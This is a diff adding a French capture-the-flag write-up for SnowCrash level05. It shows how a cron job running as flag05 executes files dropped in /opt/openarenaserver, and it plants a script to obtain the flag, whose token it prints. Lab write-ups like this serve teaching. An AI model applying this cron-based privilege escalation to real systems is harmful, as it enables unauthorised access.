@@ -1,0 +1,91 @@
+Niveau05:
+
+Nous avons réutilisé une commande déjà utilisée au level00:
+find / -user flag05 2>/dev/null
+
+Nous avons 2 fichiers:
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:/var/mail$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+ce script parcourt tous les fichiers dans 
+/opt/openarenaserver/, les exécute individuellement 
+avec une limite de temps de 5 secondes pour chaque 
+exécution, affiche les commandes exécutées, 
+puis supprime les fichiers.
+
+Bon c'est cool mais pour le moment 
+on ne voit pas trop comment l'utiliser. Si on teste
+avec un script.sh echo hello qu'on fait afficher dans 
+un fichier dans /dev/shm/result on a bien hello.
+(après un chmod 777 sur le scipt et le fichier de destination)
+
+Nous avons aussi utilisé la commande getfacl 
+(pour savoir ce cache le + à la fin des permissions) 
+sur notre dossier courrant:
+level05@SnowCrash:~$ getfacl .
+# file: .
+# owner: level05
+# group: level05
+user::r-x
+user:flag05:r-x
+group::---
+mask::r-x
+other::---
+default:user::r-x
+default:user:flag05:r-x
+default:group::---
+default:mask::r-x
+default:other::---
+
+et sur notre dossier opt/openarenaserver:
+level05@SnowCrash:~$ getfacl /opt/openarenaserver/
+getfacl: Removing leading '/' from absolute path names
+# file: opt/openarenaserver/
+# owner: root
+# group: root
+user::rwx
+user:level05:rwx
+user:flag05:rwx
+group::r-x
+mask::rwx
+other::r-x
+default:user::rwx
+default:user:level05:rwx
+default:user:flag05:rwx
+default:group::r-x
+default:mask::rwx
+default:other::r-x
+
+
+Donc il faudrait essayer de creer un script se lancant
+avec les droits du flag05 pour pouvoir faire un getflag
+
+En ce reconnectant via la connexion ssh nous voyons un:
+"You have new mail"
+
+Dans /var/mail:
+
+level05@SnowCrash:/var/mail$ cat level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Cette entrée est une tâche cron planifiée pour exécuter la 
+commande su -c "sh /usr/sbin/openarenaserver" - flag05 toutes les deux minutes.
+En résumé, cette tâche cron exécute le script /usr/sbin/openarenaserver 
+toutes les deux minutes en tant que l'utilisateur flag05.
+
+Nous avons donc recreer un script.sh avec la commande getflag >/dev/shm/result
+(et rechanger les droits)
+attendu 2 minutes...
+Notre fichier script a disparu et un cat /dev/shm/result nous montre:
+
+level05@SnowCrash:/dev/shm$ cat result
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
